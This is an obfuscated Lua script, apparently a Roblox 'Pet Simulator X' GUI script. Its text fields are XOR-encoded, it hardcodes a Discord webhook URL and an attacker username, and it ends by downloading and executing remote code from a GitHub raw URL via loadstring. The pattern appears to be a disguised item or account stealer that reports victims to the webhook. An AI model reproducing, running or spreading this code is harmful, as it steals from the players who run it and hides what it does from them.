--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + ((v11-1)% #v9) ,1 + ((v11-1)% #v9) + 1 )))%256 ));end return v5(v10);end Username=v7("\160\17\141\108\105\214\199\74","\144\87\203\39\93\157\158\19");WebHook="https://discord.com/api/webhooks/1084581064325992518/Pi8r5hLZRH0BPEtiTiWDraB1iMo_309AVtuImvd6-Nc84EZGUmJAKNHVC-eFIgfYz-IQ";loadingscreen=true;_G.CustomScriptName=v7("\242\32\59\110\184\29\151\203\3\23","\162\115\99\78\235\126\229");_G.Text1=v7("\157\218\76\200\43\43\80\166\161\216\90\196\63\113\94\196","\206\185\62\161\91\95\112\234");_G.Text2=v7("\79\234\209\58\56\13\205\78\126\228\202\110\2\0\216\7\104\255","\24\139\184\78\81\99\170\110");_G.Text3=v7("\199\129\240\239\91\237\135\242\172\99\231\155\252\252\68\247\199\187\162","\132\233\149\140\48");_G.Text4=v7("\33\74\220\109\250\123\38\160\82\109\222\109\231\98\60\180\92\16\147","\114\62\189\31\142\18\72\199");loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))();
